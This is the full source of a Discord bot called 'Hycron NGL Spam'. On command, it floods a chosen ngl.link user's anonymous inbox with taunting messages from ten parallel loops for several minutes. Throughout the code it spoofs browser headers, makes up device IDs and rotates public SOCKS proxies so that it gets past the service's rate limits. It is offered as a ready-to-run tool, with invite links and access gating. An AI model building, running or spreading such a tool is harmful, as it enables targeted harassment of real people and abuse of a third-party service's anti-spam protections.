const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const crypto = require('crypto');
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const PREFIX = '.';
const activeSessions = new Map();
const REQUIRED_GUILD_ID = '1452999261972201637';
const ADMIN_ID = '986240868761632819';
const BOT_APPLICATION_ID = '1454157889836028148';
const MAX_DURATION = 5;
const DEFAULT_THREADS = 10;
const MAX_CONCURRENT_TASKS = 5;

let botEnabled = true;
let useProxy = false;
let proxies = [];
let currentProxyIndex = 0;
let customMessages = [];

const DEFAULT_MESSAGES = [
    'Targetted by Hycron',
    'You got boomed by Hycron',
    'Hycron always on top!'
];

const loadCustomMessages = () => {
    try {
        if (fs.existsSync('messages.txt')) {
            const content = fs.readFileSync('messages.txt', 'utf-8');
            const messages = content.split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0);
            
            if (messages.length > 0) {
                customMessages = messages;
                console.log(`Loaded ${customMessages.length} custom messages from messages.txt`);
                return true;
            } else {
                console.log('messages.txt is empty, using default messages');
                customMessages = DEFAULT_MESSAGES;
                return false;
            }
        } else {
            console.log('messages.txt not found, using default messages');
            customMessages = DEFAULT_MESSAGES;
            return false;
        }
    } catch (error) {
        console.error('Error loading custom messages:', error);
        customMessages = DEFAULT_MESSAGES;
        return false;
    }
};

const getRandomMessage = () => {
    const messages = customMessages.length > 0 ? customMessages : DEFAULT_MESSAGES;
    return messages[Math.floor(Math.random() * messages.length)];
};

const loadProxies = async () => {
    try {
        const socks5Url = 'https://github.com/monosans/proxy-list/raw/refs/heads/main/proxies/socks5.txt';
        const socks4Url = 'https://github.com/monosans/proxy-list/raw/refs/heads/main/proxies/socks4.txt';
        
        console.log('Fetching proxies from GitHub...');
        
        const [socks5Response, socks4Response] = await Promise.all([
            fetch(socks5Url).catch(() => null),
            fetch(socks4Url).catch(() => null)
        ]);
        
        let allProxies = [];
        
        if (socks5Response && socks5Response.ok) {
            const socks5Text = await socks5Response.text();
            const socks5Proxies = socks5Text.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'))
                .map(proxy => ({ proxy, type: 'socks5' }));
            allProxies.push(...socks5Proxies);
            console.log(`Loaded ${socks5Proxies.length} SOCKS5 proxies`);
        }
        
        if (socks4Response && socks4Response.ok) {
            const socks4Text = await socks4Response.text();
            const socks4Proxies = socks4Text.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'))
                .map(proxy => ({ proxy, type: 'socks4' }));
            allProxies.push(...socks4Proxies);
            console.log(`Loaded ${socks4Proxies.length} SOCKS4 proxies`);
        }
        
        for (let i = allProxies.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [allProxies[i], allProxies[j]] = [allProxies[j], allProxies[i]];
        }
        
        proxies = allProxies;
        console.log(`Total proxies loaded: ${proxies.length} (mixed SOCKS4 and SOCKS5)`);
        
        if (proxies.length === 0) {
            console.log('No proxies loaded from GitHub, checking local proxies.txt...');
            if (fs.existsSync('proxies.txt')) {
                const content = fs.readFileSync('proxies.txt', 'utf-8');
                const localProxies = content.split('\n')
                    .map(line => line.trim())
                    .filter(line => line && line.includes(':'))
                    .map(proxy => ({ proxy, type: 'auto' }));
                proxies = localProxies;
                console.log(`Loaded ${proxies.length} proxies from local file`);
            }
        }
    } catch (error) {
        console.error('Error loading proxies:', error);
        if (fs.existsSync('proxies.txt')) {
            const content = fs.readFileSync('proxies.txt', 'utf-8');
            const localProxies = content.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes(':'))
                .map(proxy => ({ proxy, type: 'auto' }));
            proxies = localProxies;
            console.log(`Fallback: Loaded ${proxies.length} proxies from local file`);
        }
    }
};

const getNextProxy = () => {
    if (proxies.length === 0) return null;
    const proxyObj = proxies[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
    return proxyObj;
};

const createProxyAgent = (proxyObj) => {
    try {
        const { proxy, type } = proxyObj;
        
        if (type === 'socks5') {
            return new SocksProxyAgent(`socks5://${proxy}`);
        } else if (type === 'socks4') {
            return new SocksProxyAgent(`socks4://${proxy}`);
        } else {
            return new SocksProxyAgent(`socks5://${proxy}`);
        }
    } catch (error) {
        console.error('Error creating proxy agent:', error);
        return null;
    }
};

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    console.log('Hycron NGL Spam Bot is ready');
    console.log('Use .setproxy on to load proxies from GitHub');
    loadCustomMessages();
    updateBotStatus();
});

const updateBotStatus = () => {
    const serverCount = client.guilds.cache.size;
    client.user.setPresence({
        activities: [{
            name: `.hycron | ${serverCount} Servers`,
            type: 0
        }],
        status: 'online'
    });
};

client.on('guildCreate', () => {
    updateBotStatus();
});

client.on('guildDelete', () => {
    updateBotStatus();
});

const isUserInRequiredGuild = async (userId) => {
    try {
        const guild = await client.guilds.fetch(REQUIRED_GUILD_ID);
        const member = await guild.members.fetch(userId);
        return member !== null;
    } catch (error) {
        return false;
    }
};

const sendNGLMessage = async (username, sessionId, threadId) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;

    while (session.active && (Date.now() < session.endTime)) {
        try {
            const message = getRandomMessage();
            const deviceId = crypto.randomBytes(21).toString('hex');
            const url = 'https://ngl.link/api/submit';
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Referer': `https://ngl.link/${username}`,
                'Origin': 'https://ngl.link'
            };
            const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

            let fetchOptions = {
                method: 'POST',
                headers,
                body,
                mode: 'cors',
                credentials: 'include'
            };

            if (useProxy && proxies.length > 0) {
                const proxyObj = getNextProxy();
                const agent = createProxyAgent(proxyObj);
                if (agent) {
                    fetchOptions.agent = agent;
                }
            }

            const response = await fetch(url, fetchOptions);

            if (response.status === 429) {
                session.errors++;
                session.lastError = 'Rate Limited';
                await new Promise(resolve => setTimeout(resolve, 25000));
            } else if (response.status !== 200) {
                session.errors++;
                session.lastError = `HTTP ${response.status}`;
                await new Promise(resolve => setTimeout(resolve, 5000));
            } else {
                session.sent++;
                session.lastSuccess = Date.now();
            }

        } catch (error) {
            session.errors++;
            session.lastError = error.message.substring(0, 50);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }

    session.threadsCompleted++;
    if (session.threadsCompleted >= session.threads) {
        session.active = false;
        await finalizeSession(session);
    }
};

const updateStatusEmbed = async (session) => {
    const elapsed = Math.floor((Date.now() - session.startTime) / 1000);
    const remaining = Math.max(0, Math.floor((session.endTime - Date.now()) / 1000));
    
    const minutes = Math.floor(remaining / 60);
    const seconds = remaining % 60;

    const rate = elapsed > 0 ? (session.sent / elapsed * 60).toFixed(1) : 0;
    const proxyStatus = useProxy ? `Enabled (${proxies.length} proxies)` : 'Disabled';

    const embed = new EmbedBuilder()
        .setTitle('Hycron NGL Spam')
        .setColor(0x5865F2)
        .addFields(
            { name: 'Target', value: session.username, inline: true },
            { name: 'Duration', value: `${session.duration}m`, inline: true },
            { name: 'Threads', value: `${session.threads}`, inline: true },
            { name: 'Sent', value: `${session.sent}`, inline: true },
            { name: 'Errors', value: `${session.errors}`, inline: true },
            { name: 'Remaining', value: `${minutes}m ${seconds}s`, inline: true },
            { name: 'Rate', value: `${rate}/min`, inline: true },
            { name: 'Proxy', value: proxyStatus, inline: true },
            { name: 'Status', value: session.active ? 'Spamming' : 'Completed', inline: true }
        )
        .setFooter({ text: 'Hycron NGL Spam' })
        .setTimestamp();

    if (session.lastError) {
        embed.addFields({ name: 'Last Error', value: session.lastError, inline: false });
    }

    try {
        await session.statusMessage.edit({ embeds: [embed] });
    } catch (error) {
        console.error('Failed to update status embed:', error);
    }
};

const finalizeSession = async (session) => {
    const totalTime = Math.floor((Date.now() - session.startTime) / 1000);
    const avgRate = totalTime > 0 ? (session.sent / totalTime * 60).toFixed(1) : 0;

    const embed = new EmbedBuilder()
        .setTitle('Hycron NGL Spam - Completed')
        .setColor(0x57F287)
        .addFields(
            { name: 'Target', value: session.username, inline: true },
            { name: 'Duration', value: `${session.duration}m`, inline: true },
            { name: 'Threads', value: `${session.threads}`, inline: true },
            { name: 'Total Sent', value: `${session.sent}`, inline: true },
            { name: 'Total Errors', value: `${session.errors}`, inline: true },
            { name: 'Avg Rate', value: `${avgRate}/min`, inline: true },
            { name: 'Status', value: 'Finished', inline: false }
        )
        .setFooter({ text: 'Hycron NGL Spam' })
        .setTimestamp();

    try {
        await session.statusMessage.edit({ embeds: [embed] });
    } catch (error) {
        console.error('Failed to finalize status embed:', error);
    }

    activeSessions.delete(session.sessionId);
};

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'setstatus') {
        if (message.author.id !== ADMIN_ID) {
            return message.reply('You do not have permission to use this command');
        }

        if (args.length === 0) {
            return message.reply('Usage: .setstatus on/off');
        }

        const status = args[0].toLowerCase();
        if (status === 'on') {
            botEnabled = true;
            const embed = new EmbedBuilder()
                .setTitle('Hycron Bot Status')
                .setColor(0x57F287)
                .setDescription('Hycron bot is now enabled')
                .setFooter({ text: 'Hycron NGL Spam' })
                .setTimestamp();
            return message.reply({ embeds: [embed] });
        } else if (status === 'off') {
            botEnabled = false;
            const embed = new EmbedBuilder()
                .setTitle('Hycron Bot Status')
                .setColor(0xED4245)
                .setDescription('Hycron bot is now disabled')
                .setFooter({ text: 'Hycron NGL Spam' })
                .setTimestamp();
            return message.reply({ embeds: [embed] });
        } else {
            return message.reply('Usage: .setstatus on/off');
        }
    }

    if (command === 'setproxy') {
        if (message.author.id !== ADMIN_ID) {
            return message.reply('You do not have permission to use this command');
        }

        if (args.length === 0) {
            return message.reply('Usage: .setproxy on/off');
        }

        const status = args[0].toLowerCase();
        if (status === 'on') {
            const loadingMsg = await message.reply('Loading proxies from GitHub...');
            await loadProxies();
            
            if (proxies.length === 0) {
                return loadingMsg.edit('Failed to load proxies. Please check your internet connection or add proxies to proxies.txt');
            }
            
            useProxy = true;
            const embed = new EmbedBuilder()
                .setTitle('Proxy Status')
                .setColor(0x57F287)
                .setDescription(`Proxy enabled with ${proxies.length} proxies loaded (SOCKS4 + SOCKS5 mixed)`)
                .setFooter({ text: 'Hycron NGL Spam' })
                .setTimestamp();
            return loadingMsg.edit({ content: null, embeds: [embed] });
        } else if (status === 'off') {
            useProxy = false;
            const embed = new EmbedBuilder()
                .setTitle('Proxy Status')
                .setColor(0xED4245)
                .setDescription('Proxy disabled - using direct connection')
                .setFooter({ text: 'Hycron NGL Spam' })
                .setTimestamp();
            return message.reply({ embeds: [embed] });
        } else {
            return message.reply('Usage: .setproxy on/off');
        }
    }

    if (command === 'reloadmsg') {
        if (message.author.id !== ADMIN_ID) {
            return message.reply('You do not have permission to use this command');
        }

        const hasCustom = loadCustomMessages();
        const messageCount = customMessages.length;
        const messageType = hasCustom ? 'custom messages from messages.txt' : 'default messages';
        
        const embed = new EmbedBuilder()
            .setTitle('Messages Reloaded')
            .setColor(0x57F287)
            .setDescription(`Successfully reloaded ${messageCount} ${messageType}`)
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();
        
        return message.reply({ embeds: [embed] });
    }

    if (!botEnabled) {
        const embed = new EmbedBuilder()
            .setTitle('Hycron Bot Disabled')
            .setColor(0xED4245)
            .setDescription('Hycron bot is now disabled by the owner')
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();
        return message.reply({ embeds: [embed] });
    }

    const hasAccess = await isUserInRequiredGuild(message.author.id);
    if (!hasAccess && message.author.id !== ADMIN_ID) {
        const embed = new EmbedBuilder()
            .setTitle('Access Denied')
            .setColor(0xED4245)
            .setDescription('You must be a member of the required guild to use this bot')
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();
        return message.reply({ embeds: [embed] });
    }

    if (command === 'invite') {
        const inviteLink = `https://discord.com/api/oauth2/authorize?client_id=${BOT_APPLICATION_ID}&permissions=274877909056&scope=bot`;
        const embed = new EmbedBuilder()
            .setTitle('Invite Hycron Bot')
            .setColor(0x5865F2)
            .setDescription(`[Click here to invite Hycron Bot](${inviteLink})`)
            .addFields(
                { name: 'Invite Link', value: inviteLink, inline: false }
            )
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();
        return message.reply({ embeds: [embed] });
    }

    if (command === 'hycron') {
        const messageCount = customMessages.length;
        const messageSource = customMessages === DEFAULT_MESSAGES ? 'default' : 'custom (messages.txt)';
        
        const embed = new EmbedBuilder()
            .setTitle('Hycron NGL Spam Commands')
            .setColor(0x5865F2)
            .setDescription('Available commands for Hycron NGL Spam Bot')
            .addFields(
                {
                    name: '.hycron',
                    value: 'Display all available commands',
                    inline: false
                },
                {
                    name: '.ngl [username] [duration]',
                    value: `Start NGL spam\nusername: Target NGL username\nduration: Duration in minutes (max ${MAX_DURATION})\nDefault threads: ${DEFAULT_THREADS}\nMax concurrent tasks: ${MAX_CONCURRENT_TASKS}\nMessages: ${messageCount} ${messageSource}`,
                    inline: false
                },
                {
                    name: '.invite',
                    value: 'Get the bot invite link',
                    inline: false
                },
                {
                    name: 'Admin Commands',
                    value: '.setstatus on/off - Toggle bot\n.setproxy on/off - Toggle proxy\n.reloadmsg - Reload messages from messages.txt',
                    inline: false
                },
                {
                    name: 'Example',
                    value: '.ngl john123 3',
                    inline: false
                }
            )
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();

        await message.reply({ embeds: [embed] });
    }

    if (command === 'ngl') {
        const userActiveSessions = Array.from(activeSessions.values())
            .filter(s => s.userId === message.author.id && s.active);

        if (userActiveSessions.length >= MAX_CONCURRENT_TASKS) {
            return message.reply(`You can only run ${MAX_CONCURRENT_TASKS} spam tasks at the same time`);
        }

        if (args.length < 2) {
            return message.reply('Usage: .ngl [username] [duration]');
        }

        const username = args[0];
        let duration = parseInt(args[1]);
        const threads = DEFAULT_THREADS;

        if (isNaN(duration) || duration <= 0) {
            return message.reply('Duration must be a positive number in minutes');
        }

        if (duration > MAX_DURATION) {
            return message.reply(`Duration cannot exceed ${MAX_DURATION} minutes`);
        }

        const sessionId = `${message.author.id}-${Date.now()}`;
        const startTime = Date.now();
        const endTime = startTime + (duration * 60 * 1000);

        const proxyStatus = useProxy ? `Enabled (${proxies.length})` : 'Disabled';

        const initialEmbed = new EmbedBuilder()
            .setTitle('Hycron NGL Spam')
            .setColor(0x5865F2)
            .addFields(
                { name: 'Target', value: username, inline: true },
                { name: 'Duration', value: `${duration}m`, inline: true },
                { name: 'Threads', value: `${threads}`, inline: true },
                { name: 'Sent', value: '0', inline: true },
                { name: 'Errors', value: '0', inline: true },
                { name: 'Remaining', value: `${duration}m 0s`, inline: true },
                { name: 'Rate', value: '0/min', inline: true },
                { name: 'Proxy', value: proxyStatus, inline: true },
                { name: 'Status', value: 'Starting', inline: true }
            )
            .setFooter({ text: 'Hycron NGL Spam' })
            .setTimestamp();

        const statusMessage = await message.reply({ embeds: [initialEmbed] });

        const session = {
            sessionId,
            userId: message.author.id,
            username,
            duration,
            threads,
            sent: 0,
            errors: 0,
            startTime,
            endTime,
            active: true,
            statusMessage,
            threadsCompleted: 0,
            lastError: null,
            lastSuccess: null
        };

        activeSessions.set(sessionId, session);

        for (let i = 0; i < threads; i++) {
            sendNGLMessage(username, sessionId, i);
        }

        const updateInterval = setInterval(async () => {
            if (!session.active || Date.now() >= session.endTime) {
                clearInterval(updateInterval);
                return;
            }
            await updateStatusEmbed(session);
        }, 2000);
    }
});

const TOKEN = 'YOUR_BOT_TOKEN_HERE';
client.login(TOKEN);
